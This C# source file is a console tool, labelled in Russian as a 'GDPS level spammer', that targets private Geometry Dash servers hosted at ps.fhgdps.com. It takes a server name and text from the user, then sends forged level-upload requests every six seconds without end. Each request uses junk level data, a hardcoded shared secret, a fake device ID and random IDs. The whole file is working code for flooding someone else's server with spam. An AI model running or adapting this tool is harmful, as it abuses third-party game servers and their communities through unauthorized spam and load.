using System;
using System.IO;
using System.Net;
using System.Text;

namespace TestConsoleStresser
{
	internal class Program
	{
		static string fullUrl;
		static WebRequest webRequest;
		static string lvlName;
		static string lvlDesc;
		static string nick;
		
		private static void Main(string[] args)
		{
			// Title
			Console.ForegroundColor = ConsoleColor.Blue;
			Console.WriteLine("ГДПС спамер уровнями | v0.1\n");
			Console.ForegroundColor = ConsoleColor.Yellow;
			Console.WriteLine("Создатель: RMP");
			Console.WriteLine("Github: https://github.com/RMP-js\n");
			Console.ForegroundColor = ConsoleColor.White;
			
			// Get spam params
			Console.Write("Имя приватки (пример - examplepss): >> ");
			string serverName = Console.ReadLine();
			fullUrl = "http://ps.fhgdps.com/" + serverName + "/incl/levels/uploadGJLevel.php";
			Console.Write("\nНик: >> ");
			nick = Console.ReadLine();
			Console.Write("\nНазвание уровня: >> ");
			lvlName = Console.ReadLine();
			Console.Write("\nОписание уровня: >> ");
			lvlDesc = Console.ReadLine();
			
			Console.WriteLine("\nПолный URL: " + fullUrl + "\n");
			
			requestLoop();
		}	
			// Start spamming
			public static void requestLoop()
			{
				WebRequest webRequest = WebRequest.Create(fullUrl);
				// Thanks klimer :)
				char[] uuidChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
						Random random = new Random();
						string uuidString = "";
						for (int i = 0; i < 10; i++)
						{
							int num4 = random.Next(0, uuidChars.Length - 1);
							uuidString += uuidChars[num4].ToString();
						}
						webRequest.Method = "POST";
						int num5 = random.Next(1, 9999999);
						string s = string.Concat(new string[]
						{
							"&gameVersion=21&levelString=YASDHASDHJ&gjp=0&extID=",
							num5.ToString(),
							"&secret=Wmfd2893gb7&gdw=0&udid=S1541365809568826933535056522735691&uuid=",
							uuidString,
							"&levelName=",
							lvlName,
							" ",
							uuidString,
							"&levelDesc=",
							lvlDesc,
							"&userName=",
							nick,
							" &levelVersion=1&levelLength=50&audioTrack=1&levelID=",
							num5.ToString()
						});
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						webRequest.ContentType = "application/x-www-form-urlencoded";
						webRequest.ContentLength = (long)bytes.Length;
						Stream requestStream = webRequest.GetRequestStream();
						requestStream.Write(bytes, 0, bytes.Length);
						requestStream.Close();
						WebResponse response = webRequest.GetResponse();
						string text6 = new StreamReader(response.GetResponseStream()).ReadToEnd();
						if (text6 != "-1" && text6 != "-2" && text6 != "-3")
						{
							Console.ForegroundColor = ConsoleColor.DarkGreen;
							Console.WriteLine("Ответ сервера: " + text6 + " (Успех)");
							Console.ForegroundColor = ConsoleColor.White;
						} else {
							Console.ForegroundColor = ConsoleColor.Red;
							Console.WriteLine("Ответ сервера: " + text6 + " (Ошибка)");
							Console.ForegroundColor = ConsoleColor.White;
						}
				
				System.Threading.Thread.Sleep(6000); 
				requestLoop();
			}
	}
	
	
	
}